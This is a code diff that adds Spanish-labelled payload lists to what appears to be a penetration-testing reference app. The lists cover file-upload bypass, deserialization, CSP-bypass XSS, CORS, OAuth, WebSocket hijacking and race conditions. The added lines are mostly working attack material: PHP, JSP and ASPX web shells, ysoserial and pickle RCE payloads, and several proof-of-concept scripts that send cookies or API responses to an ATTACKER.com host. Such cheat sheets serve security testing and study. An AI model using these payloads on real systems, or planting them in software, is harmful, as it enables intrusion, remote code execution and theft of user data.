@@ -974,6 +974,286 @@ export const hostHeaderInjection: PayloadCategory = {
   ],
 }
 
+export const fileUploadBypass: PayloadCategory = {
+  title: "File Upload — Bypass",
+  description: "Evasión de filtros de subida: extensiones dobles, null byte, Content-Type spoofing, magic bytes y SVG/PHP shells",
+  tag: "File Upload",
+  tagColor: "bg-emerald-500/10 text-emerald-400 border-emerald-500/20",
+  payloads: [
+    // Extensiones PHP alternativas
+    "shell.php5",
+    "shell.php4",
+    "shell.php3",
+    "shell.phtml",
+    "shell.pHp",
+    "shell.PhP",
+    "shell.PHP",
+    "shell.php.jpg",
+    "shell.php.png",
+    "shell.php.gif",
+    "shell.php%00.jpg",
+    "shell.php\x00.jpg",
+    "shell.asp;.jpg",
+    "shell.aspx;.jpg",
+    // Double extension bypass
+    "shell.jpg.php",
+    "shell.png.php",
+    "shell.gif.php",
+    ".htaccess con: AddType application/x-httpd-php .jpg",
+    // Content-Type spoofing
+    "Content-Type: image/jpeg  (con contenido PHP)",
+    "Content-Type: image/png   (con contenido PHP)",
+    "Content-Type: image/gif   (con contenido PHP)",
+    // Magic bytes — prepend a PHP shell
+    "GIF89a; <?php system($_GET['cmd']); ?>",
+    "\\xff\\xd8\\xff<?php system($_GET['cmd']); ?>",
+    "\\x89PNG\\r\\n<?php system($_GET['cmd']); ?>",
+    // SVG con XSS / SSRF
+    `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>`,
+    `<svg><script>alert(document.cookie)</script></svg>`,
+    `<svg><image href="http://ATTACKER.com/steal?c="+document.cookie /></svg>`,
+    // PHP shells mínimos
+    "<?php system($_GET['cmd']); ?>",
+    "<?php passthru($_GET['cmd']); ?>",
+    "<?php echo shell_exec($_REQUEST['cmd']); ?>",
+    "<?php @eval($_POST['x']); ?>",
+    `<?php if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],'./'.$_FILES['f']['name']);}?>`,
+    // JSP shell
+    `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`,
+    // ASPX shell
+    `<% Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true}}.Start()?System.IO.Path.GetFullPath("."):string.Empty); %>`,
+  ],
+}
+
+export const deserialization: PayloadCategory = {
+  title: "Deserialization — Java / PHP / Python",
+  description: "Gadgets y payloads para deserialización insegura en Java (ysoserial), PHP unserialize y Python pickle",
+  tag: "Deserialization",
+  tagColor: "bg-rose-500/10 text-rose-400 border-rose-500/20",
+  payloads: [
+    // Java — detección de tipos serializados
+    "Objeto Java serializado: magic bytes AC ED 00 05",
+    "Base64 de objeto Java: rO0AB (inicio típico de ObjectOutputStream)",
+    // Java — ysoserial gadgets (comandos de referencia)
+    "java -jar ysoserial.jar CommonsCollections1 'id' | base64",
+    "java -jar ysoserial.jar CommonsCollections3 'id' | base64",
+    "java -jar ysoserial.jar CommonsCollections6 'id' | base64",
+    "java -jar ysoserial.jar Spring1 'id' | base64",
+    "java -jar ysoserial.jar Spring2 'id' | base64",
+    "java -jar ysoserial.jar Groovy1 'id' | base64",
+    "java -jar ysoserial.jar JRMPClient 'ATTACKER.com:1099' | base64",
+    "java -jar ysoserial.jar URLDNS 'http://ATTACKER.com' | base64",
+    // PHP — Object injection
+    `O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}`,
+    `a:2:{s:8:"username";s:5:"admin";s:8:"password";s:0:"";}`,
+    `O:8:"stdClass":1:{s:5:"admin";b:1;}`,
+    // PHP — magic method abuse
+    `O:9:"SomeClass":1:{s:4:"file";s:11:"/etc/passwd";}`,
+    // PHP — phar:// deserialization trigger
+    "phar://./upload/shell.jpg/exploit.php",
+    // Python pickle RCE
+    "import pickle,os; pickle.dumps(type('exploit',(object,),{'__reduce__':lambda self:(os.system,('id',))})())",
+    "Payload pickle base64: cos\nsystem\n(S'id'\ntR.",
+    // Python — marshal
+    "import marshal,base64; exec(marshal.loads(base64.b64decode('...'))) ",
+    // .NET viewstate sin MAC
+    "/w...== (viewstate con __VIEWSTATEGENERATOR vacío)",
+    "EnableViewStateMac=false → manipular viewstate directamente",
+    // Ruby Marshal
+    "Marshal.load con gadget GEM",
+    // Node.js — serialize-javascript / node-serialize
+    `{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}`,
+    // Generic detection headers
+    "Content-Type: application/x-java-serialized-object",
+    "Content-Type: application/x-www-form-urlencoded (con payload serializado en param)",
+  ],
+}
+
+export const xssCSPBypass: PayloadCategory = {
+  title: "XSS — CSP Bypass",
+  description: "Bypass de Content Security Policy via JSONP, angular-ng, base-uri, nonce leak y unsafe-eval gadgets",
+  tag: "XSS",
+  tagColor: "bg-yellow-500/10 text-yellow-400 border-yellow-500/20",
+  payloads: [
+    // JSONP callback injection (si CDN está en whitelist)
+    `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`,
+    `<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script><div ng-app ng-csp><div ng-include="'data:text/html,<script>alert(1)<\\/script>'"></div></div>`,
+    // AngularJS sandbox escape (CSP con unsafe-eval bloqueado)
+    `{{constructor.constructor('alert(1)')()}}`,
+    `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`,
+    `<div ng-app>{{$on.constructor('alert(1)')()}}</div>`,
+    `<script src=//SITE.com/angular.js></script><div ng-app ng-csp id=p>{{$eval.constructor('alert(1)')()}}</div>`,
+    // base-uri injection
+    `<base href="https://ATTACKER.com/">`,
+    `<base href="//ATTACKER.com/">`,
+    // script-src nonce — si nonce se repite o predice
+    `<script nonce="LEAKED_NONCE">alert(1)</script>`,
+    // unsafe-inline bypass via DOM clobbering
+    `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`,
+    // Script gadget via trusted whitelisted src
+    `<script src="https://www.google.com/jsapi?callback=alert"></script>`,
+    `<script src="https://maps.googleapis.com/maps/api/js?callback=alert"></script>`,
+    // SVG animateTransform bypass
+    `<svg><animateTransform onbegin=alert(1)></svg>`,
+    `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
+    // link preload with CSP bypass
+    `<link rel=preload as=script href=//ATTACKER.com/xss.js>`,
+    // iframe srcdoc bypass
+    `<iframe srcdoc="<script>parent.alert(1)</script>">`,
+    // Mutation XSS (mXSS)
+    `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
+    `<listing><img src=1 onerror=alert(1)></listing>`,
+  ],
+}
+
+export const corsAttacks: PayloadCategory = {
+  title: "CORS — Misconfiguration",
+  description: "Explotación de CORS mal configurado: null origin, subdomain takeover, pre-domain bypass y credenciales",
+  tag: "CORS",
+  tagColor: "bg-sky-500/10 text-sky-400 border-sky-500/20",
+  payloads: [
+    // Headers de prueba — enviar con cada request
+    "Origin: null",
+    "Origin: https://ATTACKER.com",
+    "Origin: https://target.com.ATTACKER.com",
+    "Origin: https://ATTACKERtarget.com",
+    "Origin: https://ATTACKER.target.com",
+    "Origin: https://target.com%60.ATTACKER.com",
+    "Origin: https://target.com_.ATTACKER.com",
+    "Origin: https://target.com!.ATTACKER.com",
+    "Origin: https://target.com$.ATTACKER.com",
+    // Null origin — desde iframe sandboxed
+    `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>var req=new XMLHttpRequest();req.open("GET","https://target.com/api/data",true);req.withCredentials=true;req.onload=()=>{fetch("https://ATTACKER.com/?d="+btoa(req.responseText))};req.send()</script>'></iframe>`,
+    // CORS con credenciales — PoC completo
+    `fetch("https://target.com/api/userinfo",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://ATTACKER.com/?d="+btoa(d)))`,
+    // Wildcard con credenciales (config inválida pero a veces presente)
+    "Access-Control-Allow-Origin: *  +  Access-Control-Allow-Credentials: true",
+    // Pre-flight bypass via simple request
+    "Content-Type: text/plain (evita pre-flight, permite CORS bypass con simple request)",
+    "Content-Type: application/x-www-form-urlencoded",
+    // Regex bypass en validación de Origin
+    "Origin: https://target.com.evil.com  (si validación es /target\\.com/)",
+    "Origin: https://evil-target.com  (si validación es /target.com$/)",
+    "Origin: https://target.com@evil.com",
+    // Leak via error response
+    "Enviar OPTIONS con Origin: null → si responde 200 con ACAO: null → vulnerable",
+  ],
+}
+
+export const oauthAttacks: PayloadCategory = {
+  title: "OAuth / OIDC — Ataques",
+  description: "CSRF en state, redirect_uri bypass, code leakage, implicit flow token steal y misconfigurations OIDC",
+  tag: "OAuth",
+  tagColor: "bg-purple-500/10 text-purple-400 border-purple-500/20",
+  payloads: [
+    // CSRF en state — omitir o fijar state
+    "/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=CALLBACK&scope=openid&state=FIXED_STATE",
+    "/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=CALLBACK&scope=openid  (sin state)",
+    // redirect_uri bypass
+    "/oauth/authorize?...&redirect_uri=https://ATTACKER.com",
+    "/oauth/authorize?...&redirect_uri=https://target.com.ATTACKER.com",
+    "/oauth/authorize?...&redirect_uri=https://target.com/callback%2F..%2F..%2FATTACKER.com",
+    "/oauth/authorize?...&redirect_uri=https://target.com/callback/../../../ATTACKER.com",
+    "/oauth/authorize?...&redirect_uri=https://target.com%40ATTACKER.com",
+    "/oauth/authorize?...&redirect_uri=https://ATTACKER.com%23target.com/callback",
+    // Implicit flow — token en fragment leakeado a Referer
+    "/oauth/authorize?response_type=token&client_id=CLIENT&redirect_uri=CALLBACK",
+    // Code leakage via Referer
+    "Abrir página externa desde callback → token/code en Referer header",
+    // Account linking/chaining
+    "Vincular cuenta OAuth con email ya registrado → merge sin verificación",
+    // PKCE bypass (code_verifier predecible o no validado)
+    "code_challenge=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&code_challenge_method=plain",
+    // Open redirect en post-logout
+    "/logout?redirect_uri=https://ATTACKER.com",
+    "/logout?post_logout_redirect_uri=https://ATTACKER.com",
+    // Token reuse tras revocación
+    "Reutilizar authorization code ya canjeado → verificar si acepta segunda vez",
+    // OIDC — id_token claim manipulation (alg:none)
+    '{"alg":"none"}.{"sub":"victim@target.com","email":"admin@target.com"}.',
+    // Misconfigured JWKS endpoint
+    "/.well-known/openid-configuration",
+    "/.well-known/jwks.json",
+    "/oauth/.well-known/openid-configuration",
+    // scope escalation
+    "/oauth/authorize?...&scope=openid+profile+email+admin",
+    "/oauth/authorize?...&scope=openid+read:users+write:users",
+  ],
+}
+
+export const websocketAttacks: PayloadCategory = {
+  title: "WebSocket — Injection & CSWSH",
+  description: "Cross-Site WebSocket Hijacking, message injection, CSRF via WS y explotación de mensajes sin autenticación",
+  tag: "WebSocket",
+  tagColor: "bg-teal-500/10 text-teal-400 border-teal-500/20",
+  payloads: [
+    // CSWSH PoC — Cross-Site WebSocket Hijacking
+    `<script>var ws=new WebSocket("wss://target.com/chat");ws.onopen=()=>ws.send(JSON.stringify({type:"getHistory"}));ws.onmessage=e=>fetch("https://ATTACKER.com/?d="+btoa(e.data));ws.onerror=e=>console.log(e);</script>`,
+    // Sin cookie — usando token en URL (si la app lo permite)
+    `new WebSocket("wss://target.com/ws?token=VICTIM_TOKEN")`,
+    // Mensaje inyectado — SQLi via WS
+    `{"action":"search","query":"' OR 1=1--"}`,
+    // XSS via WS message reflejado
+    `{"action":"chat","message":"<img src=x onerror=alert(1)>"}`,
+    // SSTI via WS
+    `{"action":"render","template":"{{7*7}}"}`,
+    // Prototype pollution via JSON message
+    `{"__proto__":{"admin":true},"action":"update"}`,
+    // Broken auth — enviar mensaje sin upgrade completo
+    `{"type":"auth","token":"undefined"}`,
+    `{"type":"auth","token":null}`,
+    // Path traversal en WS
+    `{"action":"readFile","path":"../../etc/passwd"}`,
+    // SSRF via WS proxy
+    `{"action":"fetch","url":"http://169.254.169.254/latest/meta-data/"}`,
+    // Enumeration via WS
+    `{"action":"getUser","id":1}`,
+    `{"action":"getUser","id":2}`,
+    // Race condition via WS — enviar múltiples mensajes simultáneos
+    "Enviar mismo mensaje 10 veces en paralelo → detectar race condition",
+    // WS subprotocol injection
+    "Sec-WebSocket-Protocol: javascript",
+    "Sec-WebSocket-Protocol: x-custom, admin",
+    // Upgrade bypass headers
+    "Connection: Upgrade, keep-alive",
+    "Upgrade: WebSocket\\r\\nX-Custom: injected",
+  ],
+}
+
+export const raceConditions: PayloadCategory = {
+  title: "Race Conditions",
+  description: "Técnicas para explotar TOCTOU, doble gasto, redención múltiple de cupones y registros concurrentes",
+  tag: "Race Condition",
+  tagColor: "bg-amber-500/10 text-amber-400 border-amber-500/20",
+  payloads: [
+    // Conceptos clave
+    "TOCTOU: Time-Of-Check to Time-Of-Use — ventana entre verificación y ejecución",
+    "Limite: 1 cupón/usuario — enviar 10 requests simultáneos con mismo cupón",
+    "Doble gasto: transferir mismo saldo en paralelo antes de actualización",
+    // Herramientas — comandos de referencia
+    "turbo intruder (Burp): race_single_packet_attack.py",
+    "ffuf -u https://target.com/coupon -X POST -d 'code=DISC50' -w /dev/null -t 50",
+    "parallel curl -s -X POST https://target.com/coupon -d code=DISC50 ::: {1..20}",
+    // PoC con fetch paralelo (JavaScript)
+    `Promise.all([...Array(20)].map(()=>fetch("/api/coupon/redeem",{method:"POST",body:JSON.stringify({code:"DISC50"}),headers:{"Content-Type":"application/json"},credentials:"include"})))`,
+    // PoC con Python asyncio
+    "import asyncio,httpx\nasync def r(c):\n  async with httpx.AsyncClient() as cl:\n    return await cl.post('/coupon',data={'code':'DISC50'},cookies={'session':c})\nasyncio.run(asyncio.gather(*[r(SESSION)]*20))",
+    // Single-packet attack (HTTP/2) — todos los requests en un solo TCP frame
+    "HTTP/2 multiplexing: enviar todos los frames DATA en el mismo paquete TCP",
+    "Burp Repeater → Group → Send group in parallel (single-packet)",
+    // Patrones de vulnerabilidad
+    "Registro doble: POST /register con mismo email en paralelo → dos cuentas",
+    "Like/vote: POST /like?postId=1 en paralelo → múltiples likes",
+    "Descarga de archivo de pago: GET /download?id=X antes de confirmar pago",
+    "Actualizar email + reset password simultáneo → tomar cuenta",
+    "Canjear puntos: POST /redeem en paralelo → saldo negativo",
+    "Crear recursos ilimitados: POST /api/project en paralelo (si hay límite de 1)",
+    // Last-byte sync technique
+    "Enviar request con header grande → buffering → enviar último byte de todos simultáneo",
+    "Connection: keep-alive + pipelining para sincronizar llegada al servidor",
+  ],
+}
+
 export const allPayloadCategories: PayloadCategory[] = [
   sqliClassic,
   sqliUnionBased,
@@ -988,6 +1268,7 @@ export const allPayloadCategories: PayloadCategory[] = [
   xssObfuscated,
   xssDOM,
   xssPolyglot,
+  xssCSPBypass,
   cmdInjection,
   cmdInjectionObfuscated,
   sstiPayloads,
@@ -1002,4 +1283,10 @@ export const allPayloadCategories: PayloadCategory[] = [
   prototypePollution,
   hostHeaderInjection,
   jwtAttacks,
+  fileUploadBypass,
+  deserialization,
+  corsAttacks,
+  oauthAttacks,
+  websocketAttacks,
+  raceConditions,
 ]
